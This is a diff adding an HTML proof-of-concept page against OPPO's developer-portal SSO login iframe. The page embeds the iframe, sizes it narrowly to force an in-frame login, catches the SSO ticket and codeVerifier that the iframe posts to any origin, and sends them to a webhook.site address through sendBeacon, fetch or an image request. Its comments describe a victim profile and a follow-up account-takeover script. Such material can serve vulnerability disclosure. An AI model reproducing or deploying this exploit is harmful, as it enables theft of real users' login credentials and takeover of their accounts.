@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<!--
+  OPPO developers.oppomobile.com - SSO ticket capture PoC
+
+  Key detail that the earlier PoC got wrong:
+    The iframe's postMessage bridge is in /static/scripts/login_iframe-a59ebd0dd3.js
+    which is ONLY served by /user/web-sso/login-iframe. If fromLocation points at
+    anything else (e.g. the portal homepage), HeyTap redirects the iframe to that
+    destination after login, the login-iframe script never re-runs, and
+    window.parent.postMessage({channel:'sdk-login-status', ...}, "*") never fires.
+
+  Fix: set fromLocation to the login-iframe URL itself. After HeyTap appends
+    ?code=...&codeChallenge=... the iframe lands back on login-iframe,
+    login_iframe-a59ebd0dd3.js re-executes, the HeyTap SDK detects the code in
+    the URL and calls onSuccess(ticket) -> callBackFunForHeyTap -> postMessage.
+
+  Test in a browser profile that is signed IN to id.heytap.com but signed OUT of
+  developers.oppomobile.com. If your dev-portal session is already live, the SDK
+  returns ticket:'' because it treats it as a no-op.
+-->
+<html>
+<head>
+<meta charset="utf-8">
+<title>OPPO SSO ticket capture</title>
+<style>
+ body{font-family:ui-monospace,Menlo,Consolas,monospace;background:#0b0b0b;color:#9cffb0;padding:16px;margin:0}
+ h1{margin:0 0 8px;font-size:16px;color:#fff}
+ #status{padding:8px;border:1px solid #333;background:#141414;margin-bottom:10px}
+ #status.hit{background:#07450e;border-color:#0f0;color:#fff}
+ #log{white-space:pre-wrap;border:1px solid #333;padding:8px;background:#141414;height:240px;overflow:auto;font-size:12px}
+ iframe{border:1px solid #333;display:block;margin-top:10px}
+</style>
+</head>
+<body>
+<h1>OPPO SSO ticket capture (narrow iframe forces loginPage fallback)</h1>
+<div id="status">initializing…</div>
+<pre id="log"></pre>
+
+<!--
+  Width <= 600 is what triggers the SDK's "loginPopper fallback to loginPage"
+  code path - no click, no popup, just an in-iframe navigation to id.heytap.com.
+  When HeyTap redirects back, it returns here, and the bridge posts the ticket.
+
+  Nested fromLocation (url-encoded once). Outer page = login-iframe with a
+  value for fromLocation. After HeyTap redirect the iframe URL becomes
+    .../login-iframe?fromLocation=x&code=...&codeChallenge=...
+  which is again login-iframe, so the bridge is active.
+-->
+<iframe id="f" width="500" height="620"
+  src="https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=https%3A%2F%2Fdevelopers.oppomobile.com%2Fuser%2Fweb-sso%2Flogin-iframe%3FfromLocation%3Dx"></iframe>
+
+<script>
+(function(){
+  var WEBHOOK = "https://webhook.site/d5c8bb4e-44ab-4edd-aa98-ce5cb4712920";
+  var statusEl = document.getElementById('status');
+  var logEl    = document.getElementById('log');
+  var seq = 0;
+
+  function line(label, obj){
+    seq++;
+    var ts = new Date().toISOString();
+    var s  = '#'+seq+' ['+ts+'] '+label+'  '+safeStringify(obj);
+    logEl.textContent += s + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+  function safeStringify(v){
+    try { return typeof v==='string' ? v : JSON.stringify(v); }
+    catch(e){ return String(v); }
+  }
+
+  // Exfil: navigator.sendBeacon is CORS-free (Content-Type: text/plain).
+  // Fallback: fetch no-cors, then an <img> GET as last-ditch.
+  function exfil(label, data){
+    var payload = JSON.stringify({label:label, ts:new Date().toISOString(), data:data});
+    try {
+      if (navigator.sendBeacon) {
+        var ok = navigator.sendBeacon(WEBHOOK, payload);
+        if (ok) { line('SENT(beacon) ' + label, data); return; }
+      }
+    } catch(e){}
+    try {
+      fetch(WEBHOOK, {method:'POST', mode:'no-cors', body:payload, keepalive:true});
+      line('SENT(fetch) ' + label, data); return;
+    } catch(e){}
+    try {
+      new Image().src = WEBHOOK + '?label=' + encodeURIComponent(label)
+                                + '&data='  + encodeURIComponent(safeStringify(data));
+      line('SENT(img) ' + label, data);
+    } catch(e){ line('EXFIL-FAILED ' + label, String(e)); }
+  }
+
+  // Heartbeat so you know the page loaded and the webhook wiring works.
+  exfil('HEARTBEAT', {
+    href:      location.href,
+    userAgent: navigator.userAgent,
+    innerW:    window.innerWidth
+  });
+  statusEl.textContent = 'listening for cross-origin postMessage from login-iframe…';
+
+  // Catch EVERY postMessage - some SDK builds use different channels.
+  window.addEventListener('message', function(ev){
+    // Log regardless of origin; the iframe posts with target "*".
+    var rec = {origin: ev.origin, data: ev.data};
+    line('RECV', rec);
+
+    // Send every message to the webhook so nothing is missed.
+    exfil('POSTMESSAGE', rec);
+
+    // Highlight the interesting one.
+    var d = ev.data;
+    if (d && typeof d === 'object' && d.channel === 'sdk-login-status') {
+      var p = d.data || {};
+      if (p.code === 'loginSuccess' && p.ticket) {
+        statusEl.classList.add('hit');
+        statusEl.textContent =
+          'TICKET CAPTURED - run ato_exploit_step2.sh with these values.\n' +
+          'ticket: '       + p.ticket + '\n' +
+          'codeVerifier: ' + p.codeVerifier;
+        exfil('TICKET_CAPTURED', p);
+      } else if (p.code === 'loginSuccess' && !p.ticket) {
+        // This is what happens when the user is already logged in to the dev portal.
+        statusEl.textContent =
+          'SDK returned loginSuccess with EMPTY ticket. Victim appears to ' +
+          'already hold an openplat session for this account. Test in a ' +
+          'profile where the dev-portal session is signed out.';
+        exfil('EMPTY_TICKET_NOOP', p);
+      }
+    }
+  }, false);
+
+  // Detect suspicious state where iframe navigates top window.
+  // (If OPPO changes SDK to top-level redirect this fires.)
+  var origHref = location.href;
+  setInterval(function(){
+    if (location.href !== origHref) {
+      exfil('TOP_NAV_DETECTED', {from: origHref, to: location.href});
+      origHref = location.href;
+    }
+  }, 1000);
+
+  // Hook the iframe's load events we CAN see from outside (just load timestamps,
+  // not the URL - that's cross-origin-blocked on purpose).
+  var iframe = document.getElementById('f');
+  iframe.addEventListener('load', function(){
+    exfil('IFRAME_LOAD', {attr_src: iframe.getAttribute('src')});
+    line('IFRAME_LOAD', 'iframe fired load event');
+  });
+})();
+</script>
+</body>
+</html>
